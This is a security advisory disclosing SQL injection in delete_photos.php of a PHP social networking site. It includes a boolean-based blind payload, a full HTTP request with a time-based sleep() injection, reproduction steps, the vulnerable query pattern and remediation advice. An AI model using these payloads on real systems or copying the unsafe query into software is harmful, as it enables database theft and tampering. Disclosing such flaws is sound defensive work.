## SQL Injection in Social Networking Site v1.0 delete_photos.php
## Credit

Discovered by: Ahmad Marzook

## Product

Social Networking Site in PHP

## Vendor

Code-Projects

## Vendor Homepage

https://code-projects.org/social-networking-site-in-php-with-source-code-2/

## Affected Version

Social Networking Site v1.0

## Software Download

https://download.code-projects.org/details/3d302382-e436-42f0-bad3-b77f176dbae9

## Vulnerability Type

SQL Injection

CWE

CWE-89 – Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)

## Severity

High

## Description

A SQL Injection vulnerability was identified in the delete_photos.php component of the Social Networking Site v1.0 application.

The vulnerability occurs because the application directly inserts user-controlled input from the id parameter into an SQL query without performing proper sanitization, validation, or parameterization.

When a request is sent to the vulnerable endpoint, the application retrieves the value of the id parameter from the HTTP request and uses it directly in a database query responsible for deleting photo records.

Because the value of id is not validated or sanitized, attackers can inject arbitrary SQL code into the query.

This allows malicious actors to manipulate the SQL query executed by the backend database.

Testing confirmed that the injection point allows time-based SQL injection, indicating that the application processes attacker-supplied SQL expressions.

The vulnerable endpoint is accessible through:

delete_photos.php

and accepts the following parameter:

id

If exploited successfully, attackers may be able to execute arbitrary SQL commands on the database server.

## Root Cause

The vulnerability is caused by unsafe SQL query construction.

The application likely uses code similar to:

$id = $_GET['id'];
$conn->query("DELETE FROM photos WHERE photos_id = '$id'");

Because the id parameter is inserted directly into the SQL query, attackers can inject malicious SQL expressions.

No input validation, sanitization, or prepared statements are used to protect the query.

<img width="782" height="607" alt="Image" src="https://github.com/user-attachments/assets/435016a1-4481-43eb-b352-8136fb1cf9d5" />


## Affected Endpoint
/social_networking_site/delete_photos.php
## Vulnerable Parameter
id

HTTP Method:

GET

## Payload PoC 1
 ```plain
Parameter: id (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=1' RLIKE (SELECT (CASE WHEN (2439=2439) THEN 1 ELSE 0x28 END))-- vmBf
 ```
## Proof of Concept 2
 
The following HTTP request demonstrates a time-based SQL injection payload used to confirm the vulnerability.
 ```plain
GET /SocialNetworkingSite_PHP/social_networking_site/delete_photos.php?id=(select(0)from(select(sleep(6)))v)%2f%2a'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22%2a%2f HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/SocialNetworkingSite_PHP/social_networking_site/photos.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=r8lic3o19qngid0clllb39s0n6
Connection: keep-alive
 ```
<img width="1512" height="982" alt="Image" src="https://github.com/user-attachments/assets/475b3928-2042-4006-9f64-a25f0b22969a" />

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:

<img width="951" height="512" alt="Image" src="https://github.com/user-attachments/assets/b059198e-6ce1-4618-9b2b-beebddc2db21" />

## Steps to Reproduce

Install and run the Social Networking Site v1.0 application.

Log into the application as a normal user.

Navigate to the photos management page.

Intercept the request to the endpoint:

delete_photos.php

Modify the id parameter with the SQL injection payload.

Send the request to the server.

## Result

The server response is delayed by approximately 6 seconds, confirming that the injected SQL sleep() function was executed by the backend database.

This behavior proves that the application is vulnerable to SQL injection.

## Impact

Successful exploitation of this vulnerability could allow attackers to:

Execute arbitrary SQL commands

Access sensitive database information

Extract user credentials and personal data

Modify or delete database records

Escalate privileges within the application

Completely compromise the backend database

Disrupt application availability

Depending on database permissions, attackers may gain full control over the application data.

## Vulnerability Classification

CWE
CWE-89 – SQL Injection

OWASP Top 10
A03:2021 – Injection

## Suggested Remediation
Use Prepared Statements

Replace dynamic SQL queries with prepared statements and parameter binding.

## Example fix:

$stmt = $conn->prepare("DELETE FROM photos WHERE photos_id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
Input Validation

Validate that the id parameter contains only numeric values.

Example:

$id = intval($_GET['id']);
Authorization Check

Ensure that users can only delete their own photos.

Example:

DELETE FROM photos WHERE photos_id = ? AND member_id = ?
Use POST Requests

Avoid performing destructive actions through GET requests.

Deletion operations should require a POST request with CSRF protection.

Principle of Least Privilege

Ensure the database user account has minimal privileges required for application functionality.

Avoid using high-privilege accounts such as root.
